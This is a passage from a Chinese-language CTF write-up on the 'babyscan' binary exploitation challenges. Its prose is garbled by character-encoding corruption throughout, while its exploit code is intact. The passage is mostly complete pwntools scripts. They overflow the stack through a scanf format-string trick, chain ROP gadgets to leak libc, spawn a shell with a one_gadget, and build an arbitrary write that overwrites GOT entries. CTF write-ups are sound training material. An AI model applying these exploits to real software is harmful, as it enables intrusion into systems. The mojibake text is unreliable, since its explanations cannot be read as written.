å—ï¼Ÿå‡å¦‚æˆ‘ä»¬è¾“å…¥sizeä¸º`22$`ï¼Œallocaä¼šç”³è¯·`buf[23]`ï¼Œåˆ°æœ€åé‚£ä¸ªscanfçš„æ—¶å€™å°±æˆäº†`scanf(\"%22$s\"ï¼Œbuf)`ã€‚å‘ç°äº†ä»€ä¹ˆï¼Ÿæˆ‘ä»¬å¯ä»¥å¾€scanfçš„ç¬¬23ä¸ªå‚æ•°æŒ‡å‘çš„åœ°å€å¤„ï¼Œå†™æ— é™é•¿åº¦çš„å­—ç¬¦ä¸²( â€¢Ì€ Ï‰ â€¢Ì )y\n\næŠŠä¸Šé¢çš„22æ”¹æˆ1ï¼Œå°±èƒ½å¾€bufä¸­è¶Šç•Œå†™å•¦ï¼Œè°ƒè¯•å¾—åˆ°æ­¤æ—¶çš„è¿”å›åœ°å€åç§»ä¸º72ã€‚ä»£ç å¦‚ä¸‹\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\npayload = cyclic(200)\n\ngdb.attach(myio,\"b *0x401364 \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\n\nmyio.interactive()\n```\n\nåˆ°æ­¤å·²ç»å¯ä»¥åŠ«æŒæ§åˆ¶æµäº†ã€‚ç¨‹åºä¸­æ²¡æœ‰åé—¨å‡½æ•°ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾libcä¸­one_gadgetï¼Œæˆ–è€…é€šè¿‡ROPgadgetå¸ƒç½®å¥½æ ˆç©ºé—´è·å¾—shellã€‚è¿™ä¸¤ç§æ–¹æ³•çš„å‰æéƒ½æ˜¯è¦æƒ³åŠæ³•æ³„éœ²libcåŸºå€ã€‚\n\n## æ³„éœ²libcåŸºå€\n\næ ¹æ®gotè¡¨ä¸­çš„çš„å‡½æ•°ï¼ŒåŠè°ƒè¯•ä¿¡æ¯ï¼Œè€ƒè™‘é€šè¿‡`puts(snprintf_got)`æ‰“å°libcåœ°å€ã€‚\n\n```\n.got.plt:0000000000404018 off_404018      dq offset puts          ; DATA XREF: _puts+4â†‘r\n.got.plt:0000000000404020 off_404020      dq offset setbuf        ; DATA XREF: _setbuf+4â†‘r\n.got.plt:0000000000404028 off_404028      dq offset printf        ; DATA XREF: _printf+4â†‘r\n.got.plt:0000000000404030 off_404030      dq offset snprintf      ; DATA XREF: _snprintf+4â†‘r\n.got.plt:0000000000404038 off_404038      dq offset alarm         ; DATA XREF: _alarm+4â†‘r\n.got.plt:0000000000404040 off_404040      dq offset atoi          ; DATA XREF: _atoi+4â†‘r\n.got.plt:0000000000404048 off_404048      dq offset __isoc99_scanf\n.got.plt:0000000000404048                                         ; DATA XREF: ___isoc99_scanf+4â†‘r\n.got.plt:0000000000404050 off_404050      dq offset __ctype_b_loc ; DATA XREF: ___ctype_b_loc+4â†‘r\n```\n\nä¸ºæ­¤ï¼Œåªéœ€é€šè¿‡ROPgadgetæ‰¾åˆ°ä¸€æ¡æ§åˆ¶rdiï¼ˆ64ä½ä¸‹å­˜æ”¾å‡½æ•°è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰çš„ä»£ç ç‰‡æ®µï¼Œå³0x401433ã€‚\n\n```bash\n$ ROPgadget --binary ./bin/chall | grep rdi\n0x00000000004012d6 : mov word ptr [rax + rdi*8], fs ; sldt word ptr [rax] ; add bl, ch ; jmp 0xffffffff82029c2b\n0x0000000000401186 : or dword ptr [rdi + 0x404068], edi ; jmp rax\n0x0000000000401433 : pop rdi ; ret\n0x00000000004011f8 : stosd dword ptr [rdi], eax ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n```\n\næœ€åï¼Œåœ¨æ ˆä¸Šä¾æ¬¡å¸ƒç½®å¥½`pop rdi;ret`åœ°å€ï¼Œ`snprintf`gotè¡¨é¡¹åœ°å€ï¼Œputsçš„pltè¡¨é¡¹åœ°å€ï¼Œæœ€åæ˜¯mainå‡½æ•°åœ°å€ï¼ˆè¿™æ ·æˆ‘ä»¬å¯ä»¥å†æ¬¡å®ç°æ§åˆ¶æµåŠ«æŒï¼Œè·å¾—shellï¼‰ã€‚\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\npop_rdi = 0x401433\ngot_snprintf = 0x404030\nplt_puts = 0x4010B4\nmain_addr = 0x401216\npayload = b'a'*72+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)\n\n# gdb.attach(myio,\"b *0x401364 \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\nsnprintf_addr = u64(myio.recvline()[:6].ljust(8,b\"\\x00\"))\nlibc_base = snprintf_addr - 0x61d60\nprint(hex(libc_base))\n\nmyio.interactive()\n```\n\nä»¥ä¸Šä»£ç è·å–åˆ°libcåŸºå€å¹¶æ‰“å°åï¼Œå°†è¿”å›mainå‡½æ•°ç»§ç»­æ‰§è¡Œã€‚\n\n## get shell\n\nä½¿ç”¨one_gadgetæ‰¾åˆ°å¦‚ä¸‹3æ®µä»£ç \n\n```bash\n$ one_gadget ./lib/libc.so.6 \n0xe3afe execve(\"/bin/sh\", r15, r12)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [r12] == NULL || r12 == NULL\n\n0xe3b01 execve(\"/bin/sh\", r15, rdx)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [rdx] == NULL || rdx == NULL\n\n0xe3b04 execve(\"/bin/sh\", rsi, rdx)\nconstraints:\n  [rsi] == NULL || rsi == NULL\n  [rdx] == NULL || rdx == NULL\n```\n\né€šè¿‡è°ƒè¯•å‘ç°`ret`æ—¶çš„å¯„å­˜å™¨æƒ…å†µåªæ»¡è¶³`0xe3b01`è¿™æ®µä»£ç ï¼Œé€‰ä¸­å®ƒï¼Œæœ€ç»ˆget shellçš„å®Œæ•´è„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n# myio = remote(\"65.21.255.31\",13370)\n\npop_rdi = 0x401433\ngot_snprintf = 0x404030\nplt_puts = 0x4010B4\nmain_addr = 0x401216\npayload = b'a'*72+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)\n\n# gdb.attach(myio,\"b *0x401364 \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\nsnprintf_addr = u64(myio.recvline()[:6].ljust(8,b\"\\x00\"))\nlibc_base = snprintf_addr - 0x61d60\nprint(hex(libc_base))\n\n# one_gadget offset: 0xe3b01\nexec_bin_sh = libc_base + 0xe3b01\nmyio.sendlineafter(\"size: \",b\"1$\")\npayload = b'a'*72+p64(exec_bin_sh)\nmyio.sendlineafter(\"data: \",payload)\n\nmyio.interactive()\n```\n\n## æ€è€ƒ\n\nleak libcçš„æ—¶å€™ï¼Œä¸Šé¢ä½¿ç”¨çš„æ˜¯`puts(got_snprintf)`ï¼ŒæŒ‰ç†è¯´ç”¨printfå‡½æ•°ä¹Ÿèƒ½è¾¾åˆ°æ³„éœ²çš„æ•ˆæœï¼Œä½†æ˜¯ä¸€æ—¦å°†putsæ”¹æˆprintfï¼Œå°±ä¼šsegmentation faultã€‚\n\næŸ¥äº†äº›èµ„æ–™ï¼Œè¿™ç§é”™è¯¯æœ‰ä¸¤ç§å¯èƒ½ï¼š\n\n1. mallocä¸­æ§åˆ¶æµåŠ«æŒååµŒå¥—è°ƒç”¨printfï¼Œå› ä¸ºprintfä¹Ÿä¼šè°ƒç”¨mallocï¼Œè¿™ç§åµŒå¥—è°ƒç”¨å®¹æ˜“å‡ºé—®é¢˜\n2. `call printf`æ—¶ï¼Œæ ˆçš„çŠ¶æ€ä¸æ˜¯16å­—èŠ‚å¯¹é½\n\n[The x86-64 System V ABI guarantees 16-byte stack alignment before a `call`](https://stackoverflow.com/a/54399217)\n\nï¼ˆç±»ä¼¼åœ°ï¼ŒæŸäº›é¢˜ç›®åŠ«æŒæ§åˆ¶æµæ‰§è¡Œ`system(\"/bin/sh\")`åœ¨ubuntu16.04ä¸­èƒ½æˆåŠŸï¼Œä½†åœ¨ubuntu18.04ä¸­å°±å¤±è´¥ï¼Œä¹ŸåŒæ ·æ˜¯å› ä¸ºå¯¹é½åœ°é—®é¢˜ã€‚ï¼‰\n\nå¦‚æœç”¨printfæ³„éœ²libcï¼Œé‚£ä¹ˆæœ¬é¢˜åœ°wpå¦‚ä¸‹\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n# myio = remote(\"65.21.255.31\",13370)\n\npop_rdi = 0x401433\ngot_snprintf = 0x404030\nplt_printf = 0x4010D0\nstart_addr = 0x401130\t\t\t\t# å¦‚æœå›mainçš„è¯ï¼Œä¸‹ä¸€æ¬¡è°ƒç”¨printfæ—¶æ ˆä¸å¯¹é½ã€‚å›startå¯é¿å…è¯¥é—®é¢˜\npayload = b'a'*72+p64(0x401430)+ p64(0) + p64(0) + p64(pop_rdi)+p64(got_snprintf)+p64(plt_printf)+ p64(start_addr)\t\t# å¢åŠ äº†0x401430è¿™ä¸ªgadgetï¼Œè°ƒæ•´call printfæ—¶æ ˆå¯¹é½\n\ngdb.attach(myio,\"b *0x40136e \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\nsnprintf_addr = u64(myio.recv(6).ljust(8,b\"\\x00\"))\nlibc_base = snprintf_addr - 0x61d60\nprint(hex(libc_base))\n\n# one_gadget offset: 0xe3b01\nexec_bin_sh = libc_base + 0xe3b01\nmyio.sendlineafter(\"size: \",b\"1$\")\npayload = b'a'*72+p64(exec_bin_sh)\nmyio.sendlineafter(\"data: \",payload)\n\nmyio.interactive()\n```\n\n\n\n## å¦ä¸€ç§æ–¹æ³•ï¼šä½¿ç”¨ret2csu_init\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ncsu_first_addr = 0x40142A\ncsu_second_addr = 0x401410\n\ndef csu(rbx, rbp, r12, r13, r14, r15, next_func):\n    # pop rbx,rbp,r12,r13,r14,r15\n    # rbx should be 0,\n    # rbp should be 1,enable not to jump\n    # r15 should be the function we want to call\n    # rdi=edi=r12d\n    # rsi=r13\n    # rdx=14\n    payload = b'a'*72 + p64(0x401430) + p64(0x0) +p64(0x0)\t\t# ä½œä¸ºé€šç”¨csuå‡½æ•°æ—¶ï¼Œåä¸‰ä¸ªp64åº”å½“åˆ é™¤ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†ä½¿call printfæ—¶ï¼ˆæ³„éœ²libcï¼‰æ ˆå¯¹é½\n    payload += p64(csu_first_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu_second_addr)\n    payload += b'b' * 0x38\n    payload += p64(next_func)\n    return payload\n\n# gdb.attach(myio,\"b *0x40136E \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\n# printf(snprintf_got) \n# csu(0,1,arg1,arg2,arg3,got_printf,ret2start)\npayload1 = csu(0,1,0x404030,0,0,0x404028,0x401130)\nmyio.sendlineafter(\"data: \",payload1)\n\nlibc_snprintf = u64(myio.recv(6).ljust(8,b\"\\x00\"))\nlibc_base = libc_snprintf - 0x61d60\nprint(hex(libc_base))\n\nexec_sh = libc_base + 0xe3b01\nmyio.sendlineafter(\"size: \",b\"1$\")\npayload2 = b'a'*72 + p64(0x401432) + p64(0) + p64(exec_sh)\t\t# ä¸ºäº†æ»¡è¶³one_gadgetçš„æ¡ä»¶ï¼Œå¢åŠ äº†ä¸€æ¡0x401432ï¼Œä½¿r15å¯„å­˜å™¨ä¸º0\nmyio.sendlineafter(\"data: \",payload2)\n\nmyio.interactive()\n```\n\n# babyscan_2\n\né¢˜ç›®é™„ä»¶ï¼š[babyscan_2_c5b1d8e83c4dadd3d3d96f8f9b7ea7a717f48ea0.txz](babyscan_2_c5b1d8e83c4dadd3d3d96f8f9b7ea7a717f48ea0.txz)\n\n## é¢˜ç›®åˆ†æ\n\nç¬¬äºŒä¸ªé¢˜è·Ÿç¬¬ä¸€ä¸ªé¢˜çš„å·®åˆ«åœ¨äºï¼Œå°†allocaæ”¹æˆäº†mallocã€‚è¿™æ—¶ç”³è¯·çš„å†…å­˜åœ¨å †ä¸Šï¼Œä¸å†èƒ½å¤Ÿè½»æ˜“æ ˆæº¢å‡ºäº†ï¼Œè€Œé¢˜ç›®ä¸­ä¹Ÿæ²¡æœ‰freeå‡½æ•°ï¼Œæ— æ³•åˆ©ç”¨å †ä¸Šçš„æ•°æ®ç»“æ„åŠ«æŒæ§åˆ¶æµã€‚\n\n```\n  buf = (char*)malloc(atoi(size) + 1);\n```\n\næ ¹æ®ç¬¬ä¸€é¢˜çš„çŠ¶æ€ï¼Œ`scanf(\"%1$s\", buf)`çš„bufåœ¨å †ä¸Šï¼Œå¾€å®ƒå†™å†å¤šæ•°æ®ä¹Ÿæ²¡ç”¨ã€‚é‚£ä¹ˆèƒ½ä¸èƒ½å¾€â€œ**éšè—çš„å‚æ•°** â€é‡Œå†™å‘¢ï¼Ÿ\n\nè¾“å…¥sizeä¸º`1$saaaabbbbcccc`ï¼ŒæŸ¥çœ‹ç¬¬äºŒä¸ªscanfçš„çŠ¶æ€ã€‚RDI-æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼›RSI-å †åœ°å€ï¼›RDX-å †åœ°å€ï¼›RCX-0ï¼›R8-æ— æ•ˆåœ°å€ï¼›R9-æ ˆç©ºé—´ä½åœ°å€ï¼ˆå½“å‰æ ˆå¸§æœªä½¿ç”¨ï¼‰ã€‚ç„¶åå°±æ˜¯æ ˆä¸­çš„å‚æ•°ä¾æ¬¡æ˜¯ï¼š0x7f1488c892e8ï¼Œ0x61616161243125ï¼Œâ€œ9$saaabbâ€ï¼Œ**â€œbbcccccâ€ï¼ˆæˆ‘ä»¬å¯æ§ï¼Œå¯¹åº”`9$`ï¼‰**ã€‚\n\n```bash\n## å¯„å­˜å™¨æƒ…å†µ\n RAX  0x0\n RBX  0x401390 â—‚â€” endbr64 \n RCX  0x0\n RDX  0x5555567472a0 â—‚â€” 0x0\n RDI  0x7ffca62e5c38 â—‚â€” 0x61616173243925 /* '%9$saaa' */\n RSI  0x5555567472a0 â—‚â€” 0x0\n R8   0xffffffff\n R9   0x7ffca62e5ac0 â—‚â€” 0x2\n R10  0x40202e â—‚â€” 0x4c3b031b010073 /* 's' */\n R11  0x7ffca62e5c40 â—‚â€” '9$saaabbbbcccc'\n R12  0x401170 â—‚â€” endbr64 \n R13  0x7ffca62e5d48 â—‚â€” 0x1c\n R14  0x0\n R15  0x0\n RBP  0x7ffca62e5c60 â—‚â€” 0x0\n RSP  0x7ffca62e5c30 â€”â–¸ 0x7f1488c892e8 (__exit_funcs_lock) â—‚â€” 0x0\n RIP  0x40132b â—‚â€” call   0x401140\n\n## æ ˆä¸­æƒ…å†µ\n00:0000â”‚ rsp 0x7ffca62e5c30 â€”â–¸ 0x7f1488c892e8 (__exit_funcs_lock) â—‚â€” 0x0\n01:0008â”‚ rdi 0x7ffca62e5c38 â—‚â€” 0x61616173243925 /* '%9$saaa' */\n02:0010â”‚ r11 0x7ffca62e5c40 â—‚â€” '9$saaabbbbcccc'\n03:0018â”‚     0x7ffca62e5c48 â—‚â€” 0x636363636262 /* 'bbcccc' */\n04:0020â”‚     0x7ffca62e5c50 â€”â–¸ 0x7ffca62e5d48 â—‚â€” 0x1c\n05:0028â”‚     0x7ffca62e5c58 â€”â–¸ 0x5555567472a0 â—‚â€” 0x0\n06:0030â”‚ rbp 0x7ffca62e5c60 â—‚â€” 0x0\n07:0038â”‚     0x7ffca62e5c68 â€”â–¸ 0x7f1488abc083 (__libc_start_main+243) â—‚â€” mov    edi, eax\n```\n\nå› æ­¤ï¼Œé€šè¿‡æ§åˆ¶è¾“å…¥sizeä¸º`9$saaabb+p64(0xbabebabe)`ï¼Œä½¿`scanf(\"%9$saaa\",buf)`æ—¶å°†è¾“å…¥çš„å†…å®¹å†™å…¥åœ°å€0xbabebabeå¤„ã€‚\n\nè‡³æ­¤ï¼Œæˆ‘ä»¬è·å¾—äº†ä»»æ„åœ°å€å†™ä»»æ„å€¼ï¼ˆä¸”%sæ— é•¿åº¦é™åˆ¶ï¼‰çš„èƒ½åŠ›ã€‚é€šè¿‡å¦‚ä¸‹ä»£ç ç‰‡æ®µç¡®è®¤ä»»æ„åœ°å€å†™çš„èƒ½åŠ›\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); åªæ¥æ”¶æœ€å¤š15ä¸ªå­—ç¬¦ï¼Œä¸è¦è¾“è¶…è¿‡ï¼Œä¸ç„¶ä¼šå½±å“ä¸‹ä¸€ä¸ªscanfçš„è¾“å…¥ï¼ï¼ï¼\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\ngdb.attach(myio,\"b *0x40132b \\n c\")  \t\t# é€šè¿‡è°ƒè¯•ï¼Œçœ‹åˆ°0x404070åœ°å€å¤„è¢«æˆåŠŸå†™ä¸º0xddccbbaa\n\npayload1 = b\"\\xaa\\xbb\\xcc\\xdd\"\t\t\naaw(0x404070,payload1)\nmyio.interactive()\n```\n\næœ‰äº†ä¸€æ¬¡ä»»æ„åœ°å€å†™çš„èƒ½åŠ›ï¼Œä½†å¯¹äºåˆ©ç”¨æ¥è¯´è¿˜ä¸å¤Ÿï¼Œå› æ­¤é¦–å…ˆéœ€è¦æƒ³åŠæ³•å°†ä¸€æ¬¡å˜æˆå¤šæ¬¡ã€‚å¦å¤–gotè¡¨å¯å†™ï¼Œè€ƒè™‘å°†æŸä¸ªå‡½æ•°çš„gotè¡¨é¡¹æ”¹æˆone_gadgetåœ°å€ï¼Œå°±å¯ä»¥get shellï¼Œåœ¨è¿™ä¹‹å‰éœ€è¦å…ˆæ³„éœ²libcåŸºå€ã€‚\n\n## è®©mainè¿›å…¥å¾ªç¯\n\nç”±äºä»»æ„åœ°å€å†™å®Œä¹‹åå°±ä¼šè°ƒç”¨`exit(0)`æ¨å‡ºç¨‹åºï¼Œæ— æ³•è¿›ä¸€æ­¥æ³„éœ²æˆ–åˆ©ç”¨ä¿¡æ¯ã€‚å› æ­¤é¦–å…ˆåˆ©ç”¨ä»»æ„åœ°å€å†™ï¼Œå°†exitçš„gotè¡¨é¡¹æ”¹æˆmainå‡½æ•°æˆ–startå‡½æ•°ã€‚è¿™æ ·å°±å…·å¤‡äº†æ— æ•°æ¬¡ä»»æ„åœ°å€å†™çš„èƒ½åŠ›ã€‚\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); only handle 15 char\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\ngdb.attach(myio,\"b *0x40132b \\n c\")  \n\npayload1 = p64(0x401256)[:-1]    # return main ,éœ€è¦æ³¨æ„ï¼Œä»»æ„åœ°å€å†™çš„æ—¶å€™ï¼Œè¦å¯†åˆ‡å…³æ³¨è¢«å†™ä½ç½®æ˜¯å¦è¶…èŒƒå›´è¦†ç›–ã€‚æ¯”å¦‚è¿™é‡Œå¦‚æœä¸åœ¨æœ€ååŠ [:-1]çš„è¯å°±ä¼šå°†åä¸€ä¸ªgotè¡¨é¡¹ï¼ˆ__ctype_b_locï¼‰å†™åã€‚å¯¼è‡´å†æ¬¡è¿›mainå‡½æ•°åï¼Œæ‰§è¡Œå‡ºé”™\n# payload2 = p64(0x401170)[:-1]    # return start \naaw(0x404058,payload1)      # exit_got: 0x404058\nmyio.interactive()\n```\n\n## æ³„éœ²libcåœ°å€\n\næ€ä¹ˆæ³„éœ²libcå‘¢ï¼Ÿ\n\nåœ¨mainå‡½æ•°ä¸­æœå¯»äº†æ‰€æœ‰çš„å‡½æ•°ï¼Œä»¥åŠæ‰€æœ‰å¯èƒ½çš„æ–¹å¼ï¼Œæ— æœã€‚å› ä¸ºåªè¦æ”¹äº†mainä¸­ä½¿ç”¨åˆ°çš„ä»»ä½•ä¸€ä¸ªå‡½æ•°ï¼Œä¸‹æ¬¡å†å›åˆ°mainå‡½æ•°ï¼Œå°±æ— æ³•å†è·å¾—ä»»æ„åœ°å€å†™çš„èƒ½åŠ›äº†ï¼Œä¹Ÿå°±æ— æ³•ç»§ç»­åˆ©ç”¨äº†ã€‚\n\næ‰€ä»¥å›åˆ°gotè¡¨ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–èƒ½ç”¨çš„å‡½æ•°ã€‚å¦‚ä¸‹ï¼Œsetbufå’Œalarmå‡½æ•°ä¸æ˜¯åœ¨mainå‡½æ•°ä¸­ä½¿ç”¨ï¼Œè€Œæ˜¯init_arrayä¸­çš„setupå‡½æ•°è°ƒç”¨è¿‡çš„ã€‚alarmå‡½æ•°çš„å‚æ•°å†™æ­»äº†ï¼Œæ— æ³•è°ƒæ•´ã€‚äºæ˜¯åªå‰©ä¸‹äº†setbufè¿™ä¸ªå‡½æ•°(â—Ë‡âˆ€Ë‡â—)å˜¿å˜¿ï¼Œå¦‚æœå°†setupçš„gotè¡¨é¡¹æ”¹æˆputsçš„pltåœ°å€ï¼Œä¹Ÿè®¸èƒ½è¾“å‡ºç‚¹ä»€ä¹ˆã€‚\n\n```\n.got.plt:0000000000404018 B8 40 40 00 00 00 00 00 off_404018      dq offset puts          ; DATA XREF: _puts+4â†‘r\n.got.plt:0000000000404020 C0 40 40 00 00 00 00 00 off_404020      dq offset setbuf        ; DATA XREF: _setbuf+4â†‘r\n.got.plt:0000000000404028 C8 40 40 00 00 00 00 00 off_404028      dq offset printf        ; DATA XREF: _printf+4â†‘r\n.got.plt:0000000000404030 D0 40 40 00 00 00 00 00 off_404030      dq offset snprintf      ; DATA XREF: _snprintf+4â†‘r\n.got.plt:0000000000404038 D8 40 40 00 00 00 00 00 off_404038      dq offset alarm         ; DATA XREF: _alarm+4â†‘r\n.got.plt:0000000000404040 E8 40 40 00 00 00 00 00 off_404040      dq offset malloc        ; DATA XREF: _malloc+4â†‘r\n.got.plt:0000000000404048 F0 40 40 00 00 00 00 00 off_404048      dq offset atoi          ; DATA XREF: _atoi+4â†‘r\n.got.plt:0000000000404050 F8 40 40 00 00 00 00 00 off_404050      dq offset __isoc99_scanf\n.got.plt:0000000000404050                                                                 ; DATA XREF: ___isoc99_scanf+4â†‘r\n.got.plt:0000000000404058 00 41 40 00 00 00 00 00 off_404058      dq offset exit          ; DATA XREF: _exit+4â†‘r\n.got.plt:0000000000404060 08 41 40 00 00 00 00 00 off_404060      dq offset __ctype_b_loc ; DATA XREF: ___ctype_b_loc+4â†‘r\n```\n\næ¥çœ‹çœ‹setupå‡½æ•°ä¸­çš„ä¸‰ä¸ªsetbufï¼Œåˆ†åˆ«ç”¨æ¥åˆå§‹åŒ–stdinï¼Œstdoutå’Œstderrã€‚~~stdinå’Œstdoutå¦‚æœåŠ¨äº†çš„è¯ï¼Œå¯èƒ½ä¼šå½±å“è·Ÿç¨‹åºçš„äº¤äº’ï¼Œäºæ˜¯ç†æ‰€å½“ç„¶é€‰æ‹©stderrã€‚~~ è²Œä¼¼ç”¨å“ªä¸ªéƒ½æ— æ‰€è°“ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡è¿›mainå‡½æ•°å·²ç»åˆå§‹åŒ–è¿‡äº†ï¼Œè€Œä¸”setbufçš„gotè¡¨é¡¹è¢«æ”¹äº†ï¼Œè¿™ä¸‰æ¡ç›¸å½“äºéƒ½åºŸäº†ã€‚ï¼ˆä¸è¿‡ä¸ç¡®å®šstdin/stdoutåœ¨å…¶ä»–åœ°æ–¹æœ‰æ²¡æœ‰å¼•ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸æ”¹å®ƒä»¬ä¸ºå¥½ï¼‰\n\n```c\nvoid setup()\n{\n  setbuf(stdin, 0LL);\n  setbuf(stdout, 0LL);\n  setbuf(stderr, 0LL);\t\t// 0x401379 \tcall    _setbuf\n}\n```\n\næ–­ç‚¹ä¸‹åˆ°0x401379ï¼Œè§‚å¯Ÿæ­¤æ—¶çš„å‚æ•°åŠç›¸å…³å†…å­˜ç©ºé—´çŠ¶æ€ã€‚RDIå€¼å¦‚ä¸‹ï¼Œæ˜¯stderrï¼ˆ0x4040a0ï¼‰å¤„å­˜æ”¾çš„å€¼ï¼ˆlibcåœ°å€ï¼‰ã€‚å¦‚æœå°†setbufçš„gotè¡¨é¡¹å€¼æ›¿æ¢æˆputsçš„pltè¡¨é¡¹åœ°å€ï¼ˆ0x4010D0ï¼‰ï¼Œé‚£ä¹ˆè¿™é‡Œåº”è¯¥æ˜¯`puts(0x7ff2ff9435c0)`ï¼Œå³è¾“å‡º0xfbad2087ï¼Œå¹¶éæˆ‘ä»¬æƒ³è¦çš„libcåœ°å€ã€‚\n\n```bash\nRDI  0x7ff2ff9435c0 (_IO_2_1_stderr_) â—‚â€” 0xfbad2087\n\n# stderr: 0x4040a0 <-- 0x7ff2ff9435c0 (_IO_2_1_stderr_) <-- 0xfbad2087\n```\n\næ€ä¹ˆåŠå‘¢ï¼Œçœ‹æ¥å¾—æŠŠstderrå¤„å­˜æ”¾çš„å€¼æ”¹æ‰ã€‚æœ‰ä¸¤ç§æ”¹æ³•ï¼š\n\n- 0x7ff2ff9435c0åœ°å€é™„è¿‘æœ‰libcåœ°å€ã€‚æ‰€ä»¥å¯ä»¥å°†æœ€ä½1ä¸ªå­—èŠ‚æ”¹æˆâ€œ\\x00â€ï¼Œå¯ä»¥leakå‡º0x00007ff2ff940440è¿™ä¸ªå€¼ï¼ˆæ­¤æ—¶libcåŸºå€0x7ff2ff756000ï¼‰ï¼Œä¹‹åé€šè¿‡åç§»ï¼ˆ0x1ea440ï¼‰ä¾¿èƒ½è®¡ç®—å‡ºåŸºå€ã€‚\n\n  ```bash\n  pwndbg> x/10gx 0x7ff2ff9435c0-0x20\n  0x7ff2ff9435a0 <_IO_list_all>:\t0x00007ff2ff9435c0\t0x0000000000000000\n  0x7ff2ff9435b0:\t0x0000000000000000\t0x0000000000000000\n  0x7ff2ff9435c0 <_IO_2_1_stderr_>:\t0x00000000fbad2087\t0x00007ff2ff943643\n  0x7ff2ff9435d0 <_IO_2_1_stderr_+16>:\t0x00007ff2ff943643\t0x00007ff2ff943643\n  0x7ff2ff9435e0 <_IO_2_1_stderr_+32>:\t0x00007ff2ff943643\t0x00007ff2ff943643\n  pwndbg> x/50gx 0x7ff2ff943500\n  0x7ff2ff943500 <_nl_global_locale+96>:\t0x00007ff2ff940440\t0x00007ff2ff8f23c0\n  0x7ff2ff943510 <_nl_global_locale+112>:\t0x00007ff2ff8f14c0\t0x00007ff2ff8f1ac0\n  # æ­¤æ—¶çš„åœ°å€ç©ºé—´å¸ƒå±€\n  pwndbg> vmmap\n  ......\n      0x7ff2ff756000     0x7ff2ff778000 r--p    22000 0      /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff778000     0x7ff2ff8f0000 r-xp   178000 22000  /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff8f0000     0x7ff2ff93e000 r--p    4e000 19a000 /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff93e000     0x7ff2ff942000 r--p     4000 1e7000 /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff942000     0x7ff2ff944000 rw-p     2000 1eb000 /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n  ......\n  